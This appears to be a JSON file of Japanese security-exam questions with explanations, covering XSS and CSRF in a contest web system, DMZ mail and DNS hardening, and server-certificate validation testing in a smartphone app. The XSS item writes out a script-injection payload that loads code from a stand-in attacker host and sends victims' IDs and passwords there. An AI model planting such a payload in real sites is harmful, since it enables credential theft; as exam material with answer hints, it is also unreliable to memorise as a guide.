{
  "questions": [
    {
      "qNo": 1,
      "theme": "Webシステムの開発に関するセキュリティ (XSS, CSRF)",
      "description": "L社は，ソフトウェア受託開発企業である。このたびL社は，食品製造会社M社から，M社製品の宣伝目的で行う懸賞への応募受付を主要機能とするWebシステム（以下，懸賞システムという）の開発を受託した。懸賞システムの開発プロジェクトのリーダには，L社開発部のJ主任が任命された。\n\n### 〔画面と遷移〕\nL社では，懸賞システムの画面と遷移について，図1の案を作成した。\n\n```mermaid\ngraph TD\n    S11[\"画面 1-1<br/>懸賞システム<br/>トップページ\"] \n    S21[\"画面 2-1<br/>キャンペーン検索\"] \n    S22[\"画面 2-2<br/>検索結果\"]\n    S31[\"画面 3-1<br/>ログイン\"]\n    S32[\"画面 3-2<br/>ログイン完了\"]\n    S33[\"画面 3-3<br/>マイページ\"]\n    S34[\"画面 3-4<br/>必要事項入力\"]\n    S35[\"画面 3-5<br/>必要事項確認\"]\n    S36[\"画面 3-6<br/>応募完了\"]\n    S37[\"画面 3-7<br/>メンバ登録情報の修正\"]\n    S38[\"画面 3-8<br/>メンバ登録情報の確認\"]\n    S39[\"画面 3-9<br/>修正完了\"]\n\n    S11 -- \"(あ)\" --> S21\n    S21 -- \"(い) 検索\" --> S22\n    S22 -- \"(う)\" --> S11\n    S11 -- \"(え)\" --> S31\n    S31 -- \"(お) ログイン\" --> S32\n    S32 -- \"(か)\" --> S11\n    S32 -. \"ログイン済状態\" .-> S33\n    S33 -- \"(き) 応募\" --> S34\n    S34 -- \"(く) 応募\" --> S35\n    S35 -- \"(け) OK\" --> S36\n    S36 -- \"(こ)\" --> S33\n    S33 -- \"(さ) 登録情報修正\" --> S37\n    S37 -- \"(し) 修正\" --> S38\n    S38 -- \"(す) OK\" --> S39\n    S39 -- \"(せ)\" --> S33\n```\n\n表1 画面遷移時に受け渡すパラメタ\n| 画面遷移（図1中の記号） | 画面遷移時に受け渡すパラメタ |\n| :--- | :--- |\n| (あ), (う), (え), (か), (こ), (さ), (せ) | なし |\n| (い) | キーワード |\n| (お) | メンバID, パスワード |\n| (き) | 選択したキャンペーン名 |\n| (く), (け) | 応募必要事項 |\n| (し), (す) | 住所, 氏名, 電話番号, メールアドレス |\n\n### 〔脆弱性の発見〕\n開発の総合試験において，セキュリティ専門業者のF社に脆弱性検査を依頼した。検査後，F社からL社に対して図2の報告があった。\n\n(1) 画面 2-1 から画面 2-2 への遷移において，クロスサイトスクリプティング（以下，XSS という）脆弱性を発見した。当該箇所の画面遷移例は図3のとおりである。\n(2) 画面 2-2 を表示するための図4のソースコードにおいて，10行目に問題がある。URLパラメタである keyword に対して適切な処理をすべきである。\n(3) 一部の画面において，クロスサイトリクエストフォージェリ（以下，CSRF という）脆弱性を発見した。\n\n図3 XSS 脆弱性が発見された箇所の画面遷移例\n```mermaid\ngraph LR\n    P21[画面 2-1<br/>キャンペーン検索<br/>キーワード: チョコ] -- \"検索\" --> P22[画面 2-2<br/>検索結果<br/>'チョコ'を検索した結果です。]\n```\n\n### 〔XSS 脆弱性の説明と修正〕\nJ主任とF社の検査員Nさんとの質疑応答より：\nNさん：攻撃者は，URLパラメタである keyword に攻撃用の文字列として `<script src=\"https://wana.example.jp/Login.js\"></script>` を組み込んだリンクを被害者に送付します。被害者がそのリンクをクリックした場合，図5のように改ざんされた画面 2-2' が表示されます。このときの `https://wana.example.jp/Login.js` のスクリプトは図6のとおりです。\n\n図6 のスクリプトは，被害者が入力したメンバIDとパスワードを攻撃者のWebサーバ `wana.example.jp` に送信します。",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "〔XSS 脆弱性の説明と修正〕について，(1)～(5)に答えよ。",
          "explanation": "XSS（クロスサイトスクリプティング）は、ユーザーの入力値を適切にエスケープ（無害化）せずにHTMLとして出力することで、悪意のあるスクリプトをブラウザ上で実行させる脆弱性です。\n\n### 攻撃の仕組み\n```mermaid\nsequenceDiagram\n    autonumber\n    Attacker->>Victim: 攻撃用リンクを送付\n    Note right of Attacker: https://kensho.m-sha.co.jp/...keyword=<script src=\".../Login.js\">\n    Victim->>VulnerableServer: リンクをクリックしてリクエスト\n    VulnerableServer->>Victim: 悪意のあるスクリプトを含むHTMLを応答\n    Note right of Victim: ブラウザがスクリプトを実行\n    Victim->>AttackerServer: ID・パスワードを送信\n```\n\n1. (1) スクリプトの送信先は攻撃者のサーバである `wana.example.jp` です。\n2. (2) 画面2-2を表示しているオリジナルのサーバは `kensho.m-sha.co.jp` です。\n3. (3) 異なるドメイン間のスクリプト実行やデータアクセスを制限する仕組みは「Same Origin Policy（同源ポリシー）」です。\n4. (4) 図7のフレーム構成では、攻撃者が用意したページ内に正規のページを読み込んでいます。`src`属性の`c`には正規のURL、`d`には攻撃用スクリプトのURLが入ります。\n5. (5) 攻撃が成功するためには、被害者が正規のサイト（懸賞システム）にログインした状態（セッションが維持されている状態）である必要があります。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "本文中の [ a ] に入れる適切な字句を，FQDN で答えよ。"
            },
            {
              "label": "(2)",
              "text": "画面 2-2' を表示した時点で，Web ブラウザのアドレスバーに表示される URL のホスト部を，FQDN で答えよ。"
            },
            {
              "label": "(3)",
              "text": "本文中の [ b ] に入れる適切な字句を解答群の中から選び，記号で答えよ。 (ア: AJAX, イ: HSTS, ウ: JSON, エ: Same Origin Policy)"
            }
          ]
        },
        {
          "subQNo": "設問2",
          "text": "〔CSRF 対策の説明と懸賞システムの修正〕について，(1), (2)に答えよ。",
          "explanation": "CSRF（クロスサイトリクエストフォージェリ）は、利用者が意図しないリクエスト（データの更新や削除など）を、利用者がログイン中のWebアプリケーションに対して強制的に送信させる攻撃です。\n\n### CSRF対策の原理\n1. サーバーは、正規の画面（フォーム）を表示する際に、推測困難な「トークン」を発行し、hiddenフィールドに埋め込みます。\n2. サーバーは、リクエストを受けた際に、送信されてきたトークンが、自身が発行した正当なものかを確認します。\n\n```mermaid\nsequenceDiagram\n    Server->>Browser: トークン(e)を埋め込んだフォーム(f: hidden)を送信\n    Browser->>Server: トークンを含めてPOSTリクエスト\n    Server->>Server: 保持しているトークンと一致するか検証\n```",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "図8中の [ e ], [ f ] に入れる適切な字句を，それぞれ 10 文字以内で答えよ。"
            },
            {
              "label": "(2)",
              "text": "表2中の [ g ], [ h ] に入れる記号の適切な組合せを答えよ。"
            }
          ]
        }
      ],
      "point": 34
    },
    {
      "qNo": 2,
      "theme": "DMZ上の機器の情報セキュリティ対策 (メール・DNS・プロキシ)",
      "description": "U社は，従業員数 1,500 名の機械部品製造会社である。本社の DMZ に，プロキシサーバ，外部メールサーバ，Web サーバを設置している。\n\n### 〔U社情報システムの構成〕\n```mermaid\ngraph TD\n    Internet((インターネット)) --- FW[FW]\n    FW --- L2SW_DMZ[L2SW]\n    L2SW_DMZ --- Proxy[プロキシサーバ]\n    L2SW_DMZ --- ExtMail[外部メールサーバ]\n    L2SW_DMZ --- Web[Webサーバ]\n    FW --- L3SW[L3SW]\n    L3SW --- L2SW_LAN1[L2SW]\n    L3SW --- L2SW_LAN2[L2SW]\n    L2SW_LAN1 --- Multifunction[複合機]\n    L2SW_LAN2 --- IntMail[内部メールサーバ]\n    L2SW_LAN2 --- BizServer[業務サーバ]\n```\n\n### 〔外部メールサーバの設定〕\n外部メールサーバでは、以下の機能が動作している。\n- エンベロープの宛先メールアドレスのドメイン名が U 社ドメイン以外へのメール（[ a ]）を拒否する。\n- SPF (Sender Policy Framework) による認証（[ b ]）。\n\n### 〔DNS キャッシュポイズニング攻撃〕\n図4のように、攻撃者が用意した MX レコードを DNS キャッシュに保存させる攻撃を検討する。\n\n```mermaid\nsequenceDiagram\n    Attacker->>DNS_Cache: 偽の応答を大量に送信\n    Note right of Attacker: ポート番号やID(d)を推測して一致させる\n    DNS_Cache->>DNS_Cache: 偽の情報をキャッシュに保存\n```",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "表2中の [ a ], [ b ] に入れる適切な字句を，それぞれ 10 文字以内で答えよ。",
          "explanation": "外部メールサーバ（リレーサーバ）において、外部から外部への送信を許可してしまうと、スパムメールの踏み台にされてしまいます。そのため、「第三者中継（オープンリレー）」を制限する必要があります。また、SPF認証は「送信元ドメイン」の詐称を防ぐ技術です。"
        },
        {
          "subQNo": "設問2",
          "text": "図3中及び本文中の [ c ] に入れる適切な字句を，10 文字以内で答えよ。",
          "explanation": "DNSにおいて、外部からの再帰的な問い合わせ（リカーシブクエリ）に応答してしまう設定を「オープンリゾルバ」と呼び、キャッシュポイズニングやDDoS攻撃の踏み台に悪用されます。"
        }
      ],
      "point": 33
    },
    {
      "qNo": 3,
      "theme": "スマートフォンアプリケーションの試験 (サーバ証明書の検証)",
      "description": "S社は，ECサービス会社である。Sサイト専用のスマートフォンアプリケーション（Sアプリ）を開発した。セキュリティ専門業者A氏の支援を受け、サーバ証明書の検証が適切に行われているかを試験する。\n\n### 〔Sアプリの機能概要〕\n- Sサイトとの間では HTTPS を使って通信を行う。\n- スマートフォンに対応している商用認証局から S サーバに対して発行されたサーバ証明書（Sサイト用サーバ証明書）を，S サーバの認証に使用する。\n\n### 〔サーバ証明書の検証試験環境〕\n```mermaid\ngraph LR\n    App[スマートフォン Sアプリ] --- WAP[W-AP]\n    WAP --- L2SW\n    L2SW --- TestWeb[試験用Webサーバ]\n    L2SW --- TestDNS[試験用DNSサーバ]\n    L2SW --- TestDHCP[試験用DHCPサーバ]\n```\n\n表2 不正なサーバ証明書の検出についての試験項目\n| 項番 | 試験項目 | 試験方法 | 期待される結果 |\n| :--- | :--- | :--- | :--- |\n| 1 | 発行者が不正であることの検出 | 試験用Webサーバにプライベート認証局が発行した証明書を登録する。 | エラー表示 |\n| 2 | 有効期間内でないことの検出 | 有効期限が切れた証明書を登録する。 | エラー表示 |\n| 3 | サブジェクトのコモンネームが不正であることの検出 | FQDNが一致しない証明書を登録する。 | エラー表示 |",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "〔S アプリでのサーバ証明書の検証試験〕について，(1)～(4)に答えよ。",
          "explanation": "サーバ証明書の検証では、以下の3点をチェックします。\n1. **信頼された認証局(CA)からの署名か**: ブラウザ/アプリが持つ信頼するルート証明書リストに含まれるCAが発行したものか。\n2. **有効期限内か**: 現在時刻が有効期間内か。\n3. **コモンネーム(CN)が一致するか**: 接続先のドメイン名と証明書のCN（またはSAN）が一致するか。\n\n### 検証フロー\n```mermaid\ngraph TD\n    CheckCA{信頼できるCAか?} -- No --> Error[接続エラー]\n    CheckCA -- Yes --> CheckDate{有効期限内か?}\n    CheckDate -- No --> Error\n    CheckDate -- Yes --> CheckCN{ドメイン名と一致するか?}\n    CheckCN -- No --> Error\n    CheckCN -- Yes --> OK[通信開始]\n```"
        }
      ],
      "point": 33
    }
  ]
}